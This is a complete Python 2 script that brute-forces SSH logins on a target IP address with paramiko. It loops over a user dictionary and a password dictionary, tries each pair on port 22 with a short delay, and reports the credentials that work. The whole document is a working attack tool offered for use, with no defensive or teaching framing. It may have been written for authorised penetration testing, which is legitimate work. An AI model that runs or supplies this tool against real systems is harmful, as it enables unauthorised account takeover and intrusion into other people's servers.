import sys, time
from paramiko import SSHClient
from paramiko import AutoAddPolicy

if len(sys.argv) != 4:  # As python also written in the start
    print "Usage: %s IP /path/to/user/dictionary /path/to/password/dictionary" % (str(sys.argv[0]))
    print "Example: %s 10.0.0.1 users.txt pass.txt" % (str(sys.argv[0]))
    print "Dictionary should contain passwords on newline"
    sys.exit(1)

ip = sys.argv[1]
userFilename = sys.argv[2]
passFilename = sys.argv[3]


def makelist(fileName):
    items = []
    try:
        fd = open(fileName, 'r')
        str = fd.readlines()

    except Exception, e:
        print e
        return

    for lines in str:
        string = lines.replace('\n', '').replace('\r', '')
        items.append(string)
    return items


def attempt(IP, UserName, Password):
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh.connect(IP, username=UserName, port=22, password=Password, timeout=10, allow_agent=False, look_for_keys=False, pkey=None)
    except Exception, e:
        print '\t[-] %s:%s fail!' % (UserName, Password)
    else:
        print '\n\t[!] %s:%s is CORRECT!' % (UserName, Password)
    ssh.close()
    return


print '[+] Bruteforcing against %s with dictionary %s' % (ip, passFilename)
userList = makelist(userFilename)
passList = makelist(passFilename)

for user in userList:
    for password in passList:
        attempt(ip, user, password)
        time.sleep(0.3)

sys.exit(0)